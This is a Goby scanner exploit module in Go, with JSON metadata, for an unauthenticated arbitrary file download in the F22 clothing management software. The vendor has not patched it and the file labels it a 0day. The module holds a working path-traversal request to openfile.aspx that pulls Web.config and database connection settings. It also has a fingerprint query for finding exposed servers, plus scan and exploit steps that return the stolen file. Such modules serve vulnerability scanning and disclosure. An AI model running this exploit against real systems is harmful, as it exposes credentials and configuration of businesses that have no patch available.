package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "F22 clothing management software system openfile.aspx front desk arbitrary file download",
    "Description": "<p>Guangzhou Jinmingtai Software Technology Co., Ltd. is a high-tech enterprise specializing in providing information solutions for branded clothing, shoes and bags enterprises. The F22 clothing management software system developed by the company has unauthorized access to the interface. An arbitrary file download vulnerability exists in /isprit/module/openfile.aspx. Attackers can eventually exploit this vulnerability to obtain sensitive information.</p>",
    "Product": "F22 clothing management software system",
    "Homepage": "http://www.x2erp.com/",
    "DisclosureDate": "2022-10-21",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"<li><img src=\\\"images/key.gif\\\" />\"",
    "GobyQuery": "body=\"<li><img src=\\\"images/key.gif\\\" />\"",
    "Level": "2",
    "Impact": "<p>The F22 clothing management software /oa/isprit/module/openfile.aspx developed by Guangzhou Jinmingtai Software Technology Co., Ltd. has an arbitrary file download vulnerability, and attackers can obtain sensitive information such as system configuration files.</p>",
    "Recommendation": "<p>1. The manufacturer has not released a patch yet, please pay attention to the official website update in time: <a href=\"http://cvn.f18erp.com/Login.aspx\">http://cvn.f18erp.com/Login.aspx</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileselect",
            "type": "createSelect",
            "value": "Web.config,config/conn.config",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/oa/isprit/module/openfile.aspx?Url=..\\..\\..\\Web.config",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "connectionString",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/oa/isprit/module/openfile.aspx?Url=..\\..\\..\\Web.config",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "attachment",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|{{{lastbody}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "F22服装管理软件系统openfile.aspx前台任意文件下载",
            "Product": "F22服装管理软件系统",
            "Description": "<p>广州锦铭泰软件科技有限公司，是一家专业为品牌服饰鞋包企业提供信息化解决方案的高科技企业，该公司开发的F22服装管理软件系统存在接口未授权访问，通过未授权的接口/oa/isprit/module/openfile.aspx存在任意文件下载漏洞。攻击者最终可利用该漏洞获取敏感信息。<br></p>",
            "Recommendation": "<p>1、目前厂商暂未发布补丁，请及时关注官网更新：<a href=\"http://cvn.f18erp.com/Login.aspx\">http://cvn.f18erp.com/Login.aspx</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p><span style=\"color: var(--primaryFont-color);\">3、如非必要，禁止公网访问该系统。</span><br></p>",
            "Impact": "<p>广州锦铭泰软件科技有限公司开发的F22服装管理软件 /oa/isprit/module/openfile.aspx存在任意文件下载漏洞，攻击者可获取系统配置文件等敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "F22 clothing management software system openfile.aspx front desk arbitrary file download",
            "Product": "F22 clothing management software system",
            "Description": "<p>Guangzhou Jinmingtai Software Technology Co., Ltd. is a high-tech enterprise specializing in providing information solutions for branded clothing, shoes and bags enterprises. The F22 clothing management software system developed by the company has unauthorized access to the interface. An arbitrary file download vulnerability exists in /isprit/module/openfile.aspx. Attackers can eventually exploit this vulnerability to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. The manufacturer has not released a patch yet, please pay attention to the official website update in time: <a href=\"http://cvn.f18erp.com/Login.aspx\">http://cvn.f18erp.com/Login.aspx</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The F22 clothing management software /oa/isprit/module/openfile.aspx developed by Guangzhou Jinmingtai Software Technology Co., Ltd. has an arbitrary file download vulnerability, and attackers can obtain sensitive information such as system configuration files.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7365"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}